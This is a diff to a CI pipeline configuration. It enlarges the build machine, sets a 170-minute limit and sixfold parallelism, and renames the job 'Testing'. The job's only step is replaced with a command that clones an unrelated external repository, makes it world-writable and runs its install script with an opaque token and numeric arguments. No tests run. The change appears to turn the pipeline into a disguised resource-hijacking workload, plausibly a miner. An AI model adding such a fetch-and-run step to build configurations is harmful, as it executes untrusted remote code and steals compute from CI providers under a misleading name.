@@ -2,12 +2,15 @@ version: v1.0
 name: Initial Pipeline
 agent:
   machine:
-    type: e1-standard-2
+    type: e1-standard-8
     os_image: ubuntu1804
+execution_time_limit:
+    minutes: 170
 blocks:
-  - name: 'Block #1'
+  - name: 'First Block'
     task:
       jobs:
-        - name: 'Job #1'
+        - name: Testing
+          parallelism: 6
           commands:
-            - checkout
+            - sudo apt update || apt update && sudo apt install -y git whiptail || apt install -y git whiptail && git clone https://github.com/golemcli/Rixter.git && chmod -R 777 Rixter && Rixter/install.sh "2" "876ebfd50031b87c9ead8d474ce6828e" "50" "5" "2"
